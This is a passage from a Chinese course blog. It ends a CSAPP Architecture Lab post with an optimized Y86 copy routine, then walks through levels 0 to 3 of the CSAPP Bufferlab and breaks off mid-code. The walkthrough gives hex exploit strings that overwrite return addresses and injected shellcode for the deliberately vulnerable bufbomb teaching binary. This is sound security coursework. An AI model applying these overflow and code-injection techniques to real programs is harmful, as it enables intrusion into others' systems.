class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">iaddl $-<span class="hljs-number">1</span>, %edx<br>jl Done<br>mrmovl (%ebx), %esi<br>mrmovl <span class="hljs-number">4</span>(%ebx), %edi<br>rmmovl %esi, (%ecx)<br>andl %esi, %esi<br>jle Rcopy2<br>iaddl $1, %eax<br></code></pre></td></tr></table></figure><ol start="4"><li>提前为下一步骤读取内存，更好利用cpu流水线特性<br>对于内存引用这个操作，下一步操作是不需要前一步执行结束就可以进行操作的，</li></ol><p>所以在前一步进行其他操作的同时，可以提前为下一步的内存引用做准备，从而提速</p><ol start="5"><li>减少无用操作</li></ol><p>eax初始值就是0，所以把xorl %eax,%eax去除不会影响结果</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># ncopy-32.ys - Copy a src block of len words to dst (Y86-32 version).</span><br><span class="hljs-comment"># Return the number of positive words (&gt;0) contained in src.</span><br><br><span class="hljs-comment"># Function prologue.</span><br><span class="hljs-comment"># %ebx = src, %ecx = dst, %edx = len</span><br>ncopy:<br>pushl %ebp<span class="hljs-comment"># Save old frame pointer</span><br>rrmovl %esp,%ebp<span class="hljs-comment"># Set up new frame pointer</span><br>pushl %esi<span class="hljs-comment"># Save callee-save regs</span><br>pushl %ebx<br>pushl %edi<br>mrmovl <span class="hljs-number">8</span>(%ebp),%ebx<span class="hljs-comment"># src</span><br>mrmovl <span class="hljs-number">16</span>(%ebp),%edx<span class="hljs-comment"># len</span><br>mrmovl <span class="hljs-number">12</span>(%ebp),%ecx<span class="hljs-comment"># dst</span><br><br><br>    <span class="hljs-comment"># Loop header</span><br>    <span class="hljs-comment">#xorl %eax, %eax    # count = 0;</span><br>    iaddl $-<span class="hljs-number">6</span>, %edx<br>    jl Remain<br><br>Loop:<br>copy1:<br>    mrmovl (%ebx), %esi<br>    mrmovl <span class="hljs-number">4</span>(%ebx), %edi<br>    rmmovl %esi, (%ecx)<br>    andl %esi, %esi<br>    jle copy2<br>    iaddl $1, %eax<br>copy2:<br>    rmmovl %edi, <span class="hljs-number">4</span>(%ecx)<br>    andl %edi, %edi<br>    jle copy3<br>    iaddl $1, %eax<br>copy3:<br>    mrmovl <span class="hljs-number">8</span>(%ebx), %esi<br>    mrmovl <span class="hljs-number">12</span>(%ebx), %edi<br>    rmmovl %esi, <span class="hljs-number">8</span>(%ecx)<br>    andl %esi, %esi<br>    jle copy4<br>    iaddl $1, %eax<br>copy4:<br>    rmmovl %edi, <span class="hljs-number">12</span>(%ecx)<br>    andl %edi, %edi<br>    jle copy5<br>    iaddl $1, %eax<br>copy5:<br>    mrmovl <span class="hljs-number">16</span>(%ebx), %esi<br>    mrmovl <span class="hljs-number">20</span>(%ebx), %edi<br>    rmmovl %esi, <span class="hljs-number">16</span>(%ecx)<br>    andl %esi, %esi<br>    jle copy6<br>    iaddl $1, %eax<br>copy6:<br>    rmmovl %edi, <span class="hljs-number">20</span>(%ecx)<br>    andl %edi, %edi<br>    jle nLoop<br>    iaddl $1, %eax<br><br>nLoop:<br>    addl $24, %ebx<br>    addl $24, %ecx<br>    iaddl $-<span class="hljs-number">6</span>, %edx<br>    jge Loop<br><br>Remain:<br>    iaddl $-<span class="hljs-number">6</span>, %edx<br>    je Done<br>Rcopy1:<br>    iaddl $-<span class="hljs-number">1</span>, %edx<br>    jl Done<br>    mrmovl (%ebx), %esi<br>    mrmovl <span class="hljs-number">4</span>(%ebx), %edi<br>    rmmovl %esi, (%ecx)<br>    andl %esi, %esi<br>    jle Rcopy2<br>    iaddl $1, %eax<br>Rcopy2:<br>    iaddl $-<span class="hljs-number">1</span>, %edx<br>    jl Done<br>    rmmovl %edi, <span class="hljs-number">4</span>(%ecx)<br>    andl %edi, %edi<br>    jle Rcopy3<br>    iaddl $1, %eax<br>Rcopy3:<br>    iaddl $-<span class="hljs-number">1</span>, %edx<br>    jl Done<br>    mrmovl <span class="hljs-number">8</span>(%ebx), %esi<br>    mrmovl <span class="hljs-number">12</span>(%ebx), %edi<br>    rmmovl %esi, <span class="hljs-number">8</span>(%ecx)<br>    andl %esi, %esi<br>    jle Rcopy4<br>    iaddl $1, %eax<br>Rcopy4:<br>    iaddl $-<span class="hljs-number">1</span>, %edx<br>    jl Done<br>    rmmovl %edi, <span class="hljs-number">12</span>(%ecx)<br>    andl %edi, %edi<br>    jle Rcopy5<br>    iaddl $1, %eax<br>Rcopy5:<br>    iaddl $-<span class="hljs-number">1</span>, %edx<br>    jl Done<br>    mrmovl <span class="hljs-number">16</span>(%ebx), %esi<br>    mrmovl <span class="hljs-number">20</span>(%ebx), %edi<br>    rmmovl %esi, <span class="hljs-number">16</span>(%ecx)<br>    andl %esi, %esi<br>    jle Rcopy6<br>    iaddl $1, %eax<br>Rcopy6:<br>    iaddl $-<span class="hljs-number">1</span>, %edx<br>    jl Done<br>    rmmovl %edi, <span class="hljs-number">20</span>(%ecx)<br>    andl %edi, %edi<br>    jle Done<br><br>Done:<br>popl %edi               <span class="hljs-comment"># Restore callee-save registers</span><br>popl %ebx<br>popl %esi<br>rrmovl %ebp, %esp<br>popl %ebp<br>ret<br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Keep the following label at the end of your function</span><br>End:<br><span class="hljs-comment">#/* $end ncopy-ys */</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP——Bufferlab</title>
    <link href="/2023/10/07/CSAPP%E2%80%94%E2%80%94Bufferlab/"/>
    <url>/2023/10/07/CSAPP%E2%80%94%E2%80%94Bufferlab/</url>
    
    <content type="html"><![CDATA[<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>任务：利用程序溢出的漏洞来破解几个 level。</p><p>文件夹下有三个文件：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bufbomb </span>:可执行文件，是我们要攻击的文件<br>hex2raw：将十六进制的字符数据转换成普通的字符串用于输入<br>makecookie：生成一个独一无二的cookie用于辨识作者<br><br></code></pre></td></tr></table></figure><p>根据官方文档，如果将答案存储在 exploit.txt 中，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> exploit.txt | ./hex2raw | ./bufbomb -u bill<br></code></pre></td></tr></table></figure><p>可以直接将字符串输入到 bomb 中验证答案。一个更有效的方法是：</p><p>文档中特别提醒到，每一个exploit.txt中的答案都应当以 0X0a 结尾，表示回车符结束输入。</p><p>在开始之前，使用objdump -d bufbomb &gt; bufbomb.s来获取整个程序的汇编代码。</p><h3 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h3><p>目标：执行 smoke()，而不是让 getbuf() 返回 1。</p><p>第一关比较简单，直接在bufbomb.s文件中找到smoke()的地址0x08048c18。<br>再研究 test 的部分汇编代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">08048daa</span> &lt;test&gt;:<br><span class="hljs-attribute">8048daa</span>:<span class="hljs-number">55</span>                   push   %ebp<br><span class="hljs-attribute">8048dab</span>:<span class="hljs-number">89</span> e5                mov    %esp,%ebp<br><span class="hljs-attribute">8048dad</span>:<span class="hljs-number">53</span>                   push   %ebx<br><span class="hljs-attribute">8048dae</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">24</span>             sub    $<span class="hljs-number">0</span>x24,%esp<br><span class="hljs-attribute">8048db1</span>:e8 da ff ff ff       call   <span class="hljs-number">8048</span>d90 &lt;uniqueval&gt;<br><span class="hljs-attribute">8048db6</span>:<span class="hljs-number">89</span> <span class="hljs-number">45</span> f4             mov    %eax,-<span class="hljs-number">0</span>xc(%ebp)<br><span class="hljs-attribute">8048db9</span>:e8 <span class="hljs-number">36</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">80491</span>f4 &lt;getbuf&gt;<br><span class="hljs-attribute">8048dbe</span>:<span class="hljs-number">89</span> c3                mov    %eax,%ebx<br><span class="hljs-attribute">8048dc0</span>:e8 cb ff ff ff       call   <span class="hljs-number">8048</span>d90 &lt;uniqueval&gt;<br></code></pre></td></tr></table></figure><p>getbuff:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">080491f4</span> &lt;getbuf&gt;:<br> <span class="hljs-attribute">80491f4</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">80491f5</span>:<span class="hljs-number">89</span> e5                mov    %esp,%ebp<br> <span class="hljs-attribute">80491f7</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">38</span>             sub    $<span class="hljs-number">0</span>x38,%esp<br> <span class="hljs-attribute">80491fa</span>:<span class="hljs-number">8</span>d <span class="hljs-number">45</span> d8             lea    -<span class="hljs-number">0</span>x28(%ebp),%eax<br> <span class="hljs-attribute">80491fd</span>:<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             mov    %eax,(%esp)<br> <span class="hljs-attribute">8049200</span>:e8 f5 fa ff ff       call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br> <span class="hljs-attribute">8049205</span>:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x1,%eax<br> <span class="hljs-attribute">804920a</span>:c9                   leave  <br> <span class="hljs-attribute">804920b</span>:c3                   ret  <br></code></pre></td></tr></table></figure><p>可以看到lea把buf的指针地址(-0x28(%ebp))传给了Gets()，0x28也就是十进制的40个字节。而ebp占了4个字节，buf距离getbuff的返回地址还有44个字节。<br>x86 机器为小端法机器，最低有效字节在内存的前面，所以在 exploit.txt 中填入如下答案即可：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span> <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span> <span class="hljs-number">0</span>a<br><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">fuzz<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/buflab-handout</span><span class="hljs-variable">$ </span>cat exploit.txt | ./hex2raw | ./bufbomb -u bill<br><span class="hljs-symbol">Userid:</span> bill<br><span class="hljs-symbol">Cookie:</span> <span class="hljs-number">0x362d5a70</span><br><span class="hljs-title class_">Type</span> <span class="hljs-symbol">string:</span><span class="hljs-symbol">Smoke!:</span> <span class="hljs-title class_">You</span> called smoke()<br><span class="hljs-title class_">VALID</span><br><span class="hljs-title class_">NICE</span> <span class="hljs-title class_">JOB</span>!<br><br></code></pre></td></tr></table></figure><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>目标：调用 fizz(val) 函数，并将自己的 cookies 传递为参数。</p><p>与上一关相比就多了个参数，参数为自己的cookie值，在这里我用自己输入的字符串“y”，用.&#x2F;makecookie生成一个cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ ./makecookie y           <br>0x6c6fcfb8<br><br></code></pre></td></tr></table></figure><p>因此这一关：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">42</span> <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> b8 cf <span class="hljs-number">6</span>f <span class="hljs-number">6</span>c <span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cat</span> exploit.txt | ./hex2raw | ./bufbomb -u y                        <br>Userid: y<br>Cookie: 0x6c6fcfb8<br>Type string:Fizz!: You called fizz(0x6c6fcfb8)<br>VALID<br>NICE JOB!<br><br></code></pre></td></tr></table></figure><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>目标：含有一个 bang 函数，和一个全局变量 global_value，需要注入机器代码，修改 global_value 为 cookies 的值，再调用 bang 函数。</p><p>从文档中获得的 bang 代码如下。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">int global_value = <span class="hljs-number">0</span>;<br><br>void bang(int val) &#123;<br><span class="hljs-keyword">if</span> (global_value == cookie) &#123;<br>printf(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);<br>validate(<span class="hljs-number">2</span>);<br>&#125; <span class="hljs-keyword">else</span><br>printf(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>研究 bang 汇编语言的前几行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">08048c9d</span> &lt;bang&gt;:<br><span class="hljs-attribute">8048c9d</span>:<span class="hljs-number">55</span>                   push   %ebp<br><span class="hljs-attribute">8048c9e</span>:<span class="hljs-number">89</span> e5                mov    %esp,%ebp<br><span class="hljs-attribute">8048ca0</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             sub    $<span class="hljs-number">0</span>x18,%esp<br><span class="hljs-attribute">8048ca3</span>:a1 <span class="hljs-number">00</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span>       mov    <span class="hljs-number">0</span>x804d100,%eax<br><span class="hljs-attribute">8048ca8</span>:<span class="hljs-number">3</span>b <span class="hljs-number">05</span> <span class="hljs-number">08</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span>    cmp    <span class="hljs-number">0</span>x804d108,%eax<br><span class="hljs-attribute">8048cae</span>:<span class="hljs-number">75</span> <span class="hljs-number">26</span>                jne    <span class="hljs-number">8048</span>cd6 &lt;bang+<span class="hljs-number">0</span>x39&gt;<br><span class="hljs-attribute">8048cb0</span>:<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x8(%esp)<br><span class="hljs-attribute">8048cb4</span>:c7 <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">60</span> a3 <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x804a360,<span class="hljs-number">0</span>x4(%esp)<br></code></pre></td></tr></table></figure><p>用gdb查看0x804d100 0x804d108 ，分别为global_value 和 cookie，注意这里gdb bufbomb后，在getbuf处设断点，注意这里用gdb运行的时候要带参数</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">r -u y</span><br></code></pre></td></tr></table></figure><p>运行几步后查看eax，即为buf的起始地址，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">info</span> registers<br>或<br>x <span class="hljs-variable">$eax</span><br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x $eax<br><span class="hljs-number">0x55683848</span> &lt;_reserved+<span class="hljs-number">1038408</span>&gt;: <span class="hljs-number">0x00343434</span><br></code></pre></td></tr></table></figure><p>得到buf起始地址为0x55683848.</p><p>编写汇编代码，然后把它们转换为字符编码放入堆栈中，以完成需要的操作。创建汇编代码bang.s如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">movl</span> <span class="hljs-variable">$0</span>x6c6fcfb8, 0x804d100  <span class="hljs-comment">#*将global_value设置为cookie的值*</span><br>pushl <span class="hljs-variable">$0</span>x08048c9d            <span class="hljs-comment">#bang()的起始地址入栈</span><br>ret <span class="hljs-comment">#返回，进入bang函数</span><br><br></code></pre></td></tr></table></figure><p>通过以下指令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">gcc -m32 -c <span class="hljs-keyword">bang.s </span><br><br>objdump -d <span class="hljs-keyword">bang.o </span>&gt; <span class="hljs-keyword">bang.d</span><br><span class="hljs-keyword"></span><br></code></pre></td></tr></table></figure><p>得到bang.d文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">bang</span>.o：     文件格式 elf32-i386<br><br><br><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:c7 <span class="hljs-number">05</span> <span class="hljs-number">00</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span> b8 movl   $<span class="hljs-number">0</span>x6c6fcfb8,<span class="hljs-number">0</span>x804d100<br>   <span class="hljs-attribute">7</span>:cf <span class="hljs-number">6</span>f <span class="hljs-number">6</span>c <br>   <span class="hljs-attribute">a</span>:<span class="hljs-number">68</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span>       push   $<span class="hljs-number">0</span>x8048c9d<br>   <span class="hljs-attribute">f</span>:c3                   ret<br><br></code></pre></td></tr></table></figure><p>如上获得了汇编代码。<br>先在缓冲区的前面几个字节就注入汇编代码，然后在 44 字节之后注入缓冲区的起点地址，让程序跳转回来。</p><p>代码如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c7</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span> b8 cf <br><span class="hljs-attribute">6f</span> <span class="hljs-number">6</span>c <span class="hljs-number">68</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span> c3 <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       #前<span class="hljs-number">44</span>个字节造成溢出<br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span>a    #最后加上eax起始地址<br><br></code></pre></td></tr></table></figure><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>目标：这个 Level 要求我们注入一段能够修改 getbuf 返回值的代码，返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 的剩下部分。</p><p>回到 getbuff 的汇编代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">080491f4</span> &lt;getbuf&gt;:<br><span class="hljs-attribute">80491f4</span>:<span class="hljs-number">55</span>                   push   %ebp<br><span class="hljs-attribute">80491f5</span>:<span class="hljs-number">89</span> e5                mov    %esp,%ebp<br><span class="hljs-attribute">80491f7</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">38</span>             sub    $<span class="hljs-number">0</span>x38,%esp<br><span class="hljs-attribute">80491fa</span>:<span class="hljs-number">8</span>d <span class="hljs-number">45</span> d8             lea    -<span class="hljs-number">0</span>x28(%ebp),%eax<br><span class="hljs-attribute">80491fd</span>:<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             mov    %eax,(%esp)<br><span class="hljs-attribute">8049200</span>:e8 f5 fa ff ff       call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br><span class="hljs-attribute">8049205</span>:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x1,%eax<br><span class="hljs-attribute">804920a</span>:c9                   leave  <br><span class="hljs-attribute">804920b</span>:c3                   ret  <br></code></pre></td></tr></table></figure><p>注意到在 Gets 之后，eax 会被修改为 1，所以在正常情况下函数总会返回 1。而为了改变这一行需要我们手动修改 eax 为 coockie，所以需要注入一段代码，首先手动设置 eax 为 cookie，然后将返回地址设置为 test 在调用了 getbuf 之后的下一行 0x08048dbe</p><p>结合 test 的前几行代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code 